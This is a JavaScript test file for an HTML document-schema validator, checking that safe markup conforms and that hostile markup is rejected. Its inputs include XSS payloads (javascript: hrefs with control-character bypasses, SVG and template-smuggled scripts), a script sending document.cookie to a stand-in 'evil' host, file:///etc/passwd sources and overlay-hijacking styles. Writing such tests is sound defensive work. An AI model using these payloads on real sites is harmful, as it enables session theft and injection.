const test = require('node:test');
const assert = require('node:assert');
const { JSDOM } = require('jsdom');
const { validate } = require('../src/lib/schema-validate.js');

// 把磁盘字节 reparse 成 Document（§4.3 铁律③：判 reparse 出的 DOM、不判活 DOM）
function docOf(html) { return new JSDOM(html).window.document; }
const HEAD = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="wordspace-schema" content="1"></head><body>';
const FOOT = '</body></html>';
const v = (bodyHtml) => validate(docOf(HEAD + bodyHtml + FOOT));
const rules = (r) => r.violations.map((x) => x.rule);

test('合规文档 → conform', () => {
  const r = v('<h1>标题</h1><p>正文 <b>粗</b> <a href="https://x.com">链</a></p>' +
    '<ul><li>a</li><li>b<ul><li>b1</li></ul></li></ul>' +
    '<ul class="ws-todo"><li data-checked="true">x</li><li data-checked="false">y</li></ul>' +
    '<blockquote>引用</blockquote><div class="ws-callout"><p>提示</p></div><hr>');
  assert.equal(r.conform, true, JSON.stringify(r.violations));
});

test('铁律①：伪造 meta=1 + 内嵌 <script> → 仍 non-conform（不被 meta 骗）', () => {
  const r = v('<p>ok</p><script>steal()</' + 'script>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('script'));
});

test('on* 事件属性 → non-conform', () => {
  const r = v('<p onclick="x()">hi</p>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('event-attr'));
});

test('顶层非法块（section/任意 div/h5/h6）→ non-conform', () => {
  assert.equal(v('<section><p>x</p></section>').conform, false);
  assert.equal(v('<div>裸 div</div>').conform, false);
  const r = v('<h5>五级</h5>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('block-tag'));
});

test('ul/ol 直接子非 <li> → non-conform', () => {
  // 程序化塞 <p> 进 ul（绕过 parser 的内容模型纠正，确切构造违规）
  const doc = docOf(HEAD + '<ul><li>ok</li></ul>' + FOOT);
  doc.querySelector('ul').appendChild(doc.createElement('p'));
  const r = validate(doc);
  assert.equal(r.conform, false);
  assert.ok(r.violations.map((x) => x.rule).includes('list-child'));
});

test('叶子块/容器里含块级 → non-conform（callout 决策4：多段 <p> 可，列表/别的块不可）', () => {
  assert.equal(v('<div class="ws-callout"><p>a</p><p>b</p></div>').conform, true);
  assert.equal(v('<div class="ws-callout"><ul><li>x</li></ul></div>').conform, false);
});

test('表格：合并格 colspan/rowspan → non-conform；规整表 → conform', () => {
  assert.equal(v('<table class="ws-table"><tbody><tr><td>a</td><td>b</td></tr></tbody></table>').conform, true);
  const r = v('<table class="ws-table"><tbody><tr><td colspan="2">m</td></tr></tbody></table>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('table-merge'));
});

test('to-do data-checked 值域 {true,false}，越界 → non-conform', () => {
  assert.equal(v('<ul class="ws-todo"><li data-checked="maybe">x</li></ul>').conform, false);
});

test('缺 schema meta 的合法文档仍 conform（marker 非必需）', () => {
  const r = validate(docOf('<!DOCTYPE html><html><head></head><body><p>手写</p></body></html>'));
  assert.equal(r.conform, true, JSON.stringify(r.violations));
});

test('行内 javascript: 链接 → non-conform', () => {
  const r = v('<p><a href="javascript:alert(1)">x</a></p>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('unsafe-href'));
});

// ===== 对抗验证攻破：安全绕过 + 校验盲区（全部 node 真跑确认过）=====

test('P0-1 href 控制字符/空白绕过 → unsafe-href（浏览器导航会剥 tab/newline/前导控制字符再执行）', () => {
  assert.equal(v('<p><a href="java\tscript:alert(1)">x</a></p>').conform, false);
  assert.equal(v('<p><a href="java\nscript:alert(1)">x</a></p>').conform, false);
  assert.equal(v('<p><a href="\x01javascript:alert(1)">x</a></p>').conform, false);
  assert.equal(v('<p><a href="https://ok.com">x</a></p>').conform, true); // 不误杀正常 https
});

test('P0-2 SVG 命名空间 <script> → script（命名空间无关，不被小写 tagName 绕过）', () => {
  const r = v('<table class="ws-table"><tbody><tr><td><svg><script>alert(1)</' + 'script></svg></td></tr></tbody></table>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('script'));
});

test('P1-2 表格单元格只能 phrasing：iframe/object/块 → non-conform；纯行内 cell 仍 conform', () => {
  assert.equal(v('<table class="ws-table"><tbody><tr><td><iframe src="https://evil"></iframe></td></tr></tbody></table>').conform, false);
  assert.equal(v('<table class="ws-table"><tbody><tr><td><p>x</p></td></tr></tbody></table>').conform, false);
  assert.equal(v('<table class="ws-table"><tbody><tr><td><ul><li>x</li></ul></td></tr></tbody></table>').conform, false);
  assert.equal(v('<table class="ws-table"><tbody><tr><td>x <b>粗</b></td></tr></tbody></table>').conform, true);
});

test('P1-3 head 白名单：base/meta-refresh/外联 link/作者 style → non-conform；schema-css 合法', () => {
  const mk = (headExtra) => validate(docOf('<!DOCTYPE html><html><head>' + headExtra + '</head><body><p>x</p></body></html>'));
  assert.equal(mk('<base href="https://evil/">').conform, false);
  assert.equal(mk('<meta http-equiv="refresh" content="0;url=https://evil">').conform, false);
  assert.equal(mk('<link rel="stylesheet" href="https://evil/x.css">').conform, false);
  assert.equal(mk('<style>@import url(https://evil/x.css)</style>').conform, false);
  assert.equal(mk('<style data-ws-schema-css="baseline">p{margin:0}</style>').conform, true);
});

test('P2-1 表格不变式：非矩形 / caption / 多行 thead → non-conform', () => {
  assert.equal(v('<table class="ws-table"><tbody><tr><td>a</td><td>b</td></tr><tr><td>c</td></tr></tbody></table>').conform, false);
  assert.equal(v('<table class="ws-table"><caption>t</caption><tbody><tr><td>a</td></tr></tbody></table>').conform, false);
});

test('P2-2 块级 style → non-conform（带 style 块走基础编辑，显示仍原生）；行内 span style 仍合法', () => {
  assert.equal(v('<p style="color:red">x</p>').conform, false);
  assert.equal(v('<p><span style="color:red">x</span></p>').conform, true);
});

test('P2-3 figure+figcaption 合法（§5 captioned image canonical）', () => {
  assert.equal(v('<figure><img src="data:image/png;base64,AAAA"><figcaption>说明</figcaption></figure>').conform, true);
  assert.equal(v('<figure><img src="x"><p>不该有块</p></figure>').conform, false);
});

// ===== U0：toggle（<details>）内部校验（validateDetails，§2.1 规格 + §0 决策 3）=====

test('toggle 正例：open + summary 首子 + 正文可嵌块（含嵌套 details）→ conform', () => {
  assert.equal(v('<details open><summary>标题</summary><p>正文</p><ul><li>x</li></ul></details>').conform, true,
    JSON.stringify(v('<details open><summary>标题</summary><p>正文</p><ul><li>x</li></ul></details>').violations));
  // 正文里再嵌一个 toggle —— Schema 唯一允许块嵌套处
  assert.equal(v('<details><summary>外</summary><details><summary>内</summary><p>x</p></details></details>').conform, true);
});

test('toggle 缺 summary → non-conform（rule details-summary）', () => {
  const r = v('<details><p>x</p></details>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('details-summary'));
});

test('toggle 多个 summary → non-conform（rule details-summary）', () => {
  const r = v('<details><summary>a</summary><summary>b</summary></details>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('details-summary'));
});

test('toggle summary 非首子 → non-conform（rule details-summary）', () => {
  const r = v('<details><p>x</p><summary>t</summary></details>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('details-summary'));
});

test('toggle summary 内塞块 → non-conform（rule details-summary-content）', () => {
  const r = v('<details><summary>t<p>x</p></summary></details>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('details-summary-content'));
});

test('toggle 正文含非法块（h5）→ non-conform（正文走 validateBlock 继承 block-tag）', () => {
  const r = v('<details><summary>t</summary><h5>五级</h5></details>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('block-tag'));
});

// ---- 本轮对抗加固回归门（review 复现的绕过，钉死具体危险输入）----

test('P0 template 走私：表格里 <template> 藏 <script> → non-conform（原判 conform）', () => {
  // querySelectorAll(*) 不下探 template.content + validateTable 不检 template 子 → 曾判 conform。fail-closed 直接拒 template。
  const r = v('<table class="ws-table"><template><script>fetch("//evil/"+document.cookie)</' +
    'script></template><tbody><tr><td>a</td></tr></tbody></table>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('template'), rules(r).join(','));
});
test('P0 template 在任何位置都被拒（body 顶层 / details 内）', () => {
  assert.equal(v('<template><p>x</p></template>').conform, false);
  assert.equal(v('<details><summary>t</summary><template>x</template></details>').conform, false);
});

test('P0 img/资源 src 危险 scheme → non-conform（不再只查 <a>）', () => {
  for (const src of ['javascript:alert(1)', 'file:///etc/passwd', 'vbscript:x', 'blob:http://x/u',
    'data:text/html,<script>x</' + 'script>', 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=']) {
    const r = v('<p><img src="' + src + '"></p>');
    assert.equal(r.conform, false, 'img src=' + src + ' 应非法');
    assert.ok(rules(r).includes('unsafe-src'), src + ' → ' + rules(r).join(','));
  }
  assert.equal(v('<p><img srcset="file:///x 1x"></p>').conform, false); // srcset 同样查
});
test('合法媒体 data:image/png 与相对/https src 不误伤', () => {
  assert.equal(v('<p><img src="data:image/png;base64,iVBORw0KGgo="></p>').conform, true);
  assert.equal(v('<p><img src="pic.png"></p>').conform, true);
  assert.equal(v('<p><img src="https://x.com/a.png"></p>').conform, true);
});

test('P1 行内 style 危险值 → non-conform（覆盖层劫持/外链/老式执行向量）', () => {
  for (const st of ['position:fixed;inset:0;z-index:9', 'position:sticky;top:0',
    'background-image:url(http://evil/x)', 'width:expression(alert(1))', '-moz-binding:url(x)', 'behavior:url(x)']) {
    const r = v('<p><span style="' + st + '">x</span></p>');
    assert.equal(r.conform, false, 'style=' + st + ' 应非法');
    assert.ok(rules(r).includes('style-value'), st + ' → ' + rules(r).join(','));
  }
});
test('合法行内 style（排版属性）不误伤', () => {
  assert.equal(v('<p><span style="color:#c00;background-color:#ff0;font-weight:bold;text-decoration:underline">x</span></p>').conform, true);
});

test('P2 顶层裸文本 → non-conform（rule top-text，须包在块里）', () => {
  const r = v('Hello world<p>x</p>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('top-text'));
  assert.equal(v('<p>a</p>\n  <p>b</p>').conform, true); // 块之间的空白文本节点（缩进/换行）不算
});

test('P2 <a href=blob:> 也被拦（同类 scheme 遗漏）', () => {
  const r = v('<p><a href="blob:http://x/uuid">z</a></p>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('unsafe-href'));
});

// ── Bug sweep 2026-07-05：内核对抗审计整改（KV-1..KV-6 + ED-A1/A6）──

test('KV-1 phrasing 包裹绕过：块级裹 span/a 应被抓（不递归=漏判）', () => {
  // 容器
  assert.equal(v('<blockquote><span><ul><li>x</li></ul></span></blockquote>').conform, false, 'quote span ul');
  assert.equal(v('<div class="ws-callout"><span><table><tr><td>x</td></tr></table></span></div>').conform, false, 'callout span table');
  // 单元格里裹 iframe（外部内容混进合规文档的关键路径）
  assert.equal(v('<table><tr><td><span><iframe src="https://evil.example"></iframe></span></td></tr></table>').conform, false, 'cell span iframe');
  // li
  assert.equal(v('<ul><li>a<span><ul><li>y</li></ul></span></li></ul>').conform, false, 'li span ul');
  // summary / figcaption
  assert.equal(v('<details><summary><span><ul><li>x</li></ul></span></summary><p>b</p></details>').conform, false, 'summary span ul');
  assert.equal(v('<figure><img src="a.png"><figcaption><span><table><tr><td>x</td></tr></table></span></figcaption></figure>').conform, false, 'figcaption span table');
  // 正常单层 phrasing 不误伤
  assert.equal(v('<blockquote><span>普通 <b>行内</b> 文字</span></blockquote>').conform, true, 'quote 普通行内不误伤');
});

test('KV-2 data-ws2-ui 覆盖层标记不能骗过磁盘字节校验', () => {
  assert.equal(v('<p>hi<span data-ws2-ui><iframe src="https://evil.example/track"></iframe></span></p>').conform, false, 'overlay iframe');
  assert.equal(v('<p><span data-ws2-ui><button>click</button></span></p>').conform, false, 'overlay button');
  assert.equal(v('<p><span data-ws2-ui><input name="x"></span></p>').conform, false, 'overlay input');
});

test('KV-3 容器内块级元素的 style 属性要抓（p/li/td/summary/figcaption）', () => {
  assert.ok(rules(v('<blockquote><p style="color:red">hi</p></blockquote>')).includes('block-style'), 'quote>p');
  assert.ok(rules(v('<div class="ws-callout"><p style="color:red">hi</p></div>')).includes('block-style'), 'callout>p');
  assert.ok(rules(v('<ul><li style="color:red">x</li></ul>')).includes('block-style'), 'li');
  assert.ok(rules(v('<table><tr><td style="color:green">c</td></tr></table>')).includes('block-style'), 'td');
  assert.ok(rules(v('<details><summary style="color:red">s</summary><p>x</p></details>')).includes('block-style'), 'summary');
  assert.ok(rules(v('<figure><img src="a.png"><figcaption style="color:red">cap</figcaption></figure>')).includes('block-style'), 'figcaption');
});

test('KV-5 figure 必须恰含一个 img（0 或 ≥2 都非法）', () => {
  assert.equal(v('<figure><img src="a.png"></figure>').conform, true, '恰一 img 合法');
  assert.equal(v('<figure><img src="a.png"><figcaption>说明</figcaption></figure>').conform, true, 'img+caption 合法');
  assert.equal(v('<figure><img src="a.png"><img src="b.png"></figure>').conform, false, '两个 img');
  assert.equal(v('<figure><figcaption>无图</figcaption></figure>').conform, false, '零 img');
});

test('KV-6 colspan=1/rowspan=1 是 no-op，不该判合并格', () => {
  assert.equal(v('<table><tr><td colspan="1">a</td><td>b</td></tr></table>').conform, true, 'colspan=1 不算合并');
  assert.equal(v('<table><tr><td rowspan="1">a</td><td>b</td></tr></table>').conform, true, 'rowspan=1 不算合并');
  assert.ok(rules(v('<table><tr><td colspan="2">a</td></tr><tr><td>b</td><td>c</td></tr></table>')).includes('table-merge'), 'colspan=2 仍抓');
});

test('ED-A1 <strike> 是合法行内（删除线），不判非合规', () => {
  assert.equal(v('<p>hello <strike>删除线</strike> world</p>').conform, true);
  assert.equal(v('<p><s>s标签</s> 和 <strike>strike标签</strike> 等价</p>').conform, true);
});

test('ED-A6 ul/ol 直接挂裸文本 → non-conform', () => {
  const r = v('<ul>裸文本</ul>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('list-child'), rules(r).join(','));
  assert.equal(v('<ul><li>正常项</li></ul>').conform, true, '正常列表不误伤');
});

test('KV-7 span style position:absolute（配 display:block 变覆盖层）被拦', () => {
  const r = v('<p><span style="display:block;position:absolute;width:100%;height:100%">x</span></p>');
  assert.equal(r.conform, false);
  assert.ok(rules(r).includes('style-value'), rules(r).join(','));
  // 正常排版 style 不误伤
  assert.equal(v('<p><span style="color:#c00;font-weight:bold">x</span></p>').conform, true);
});
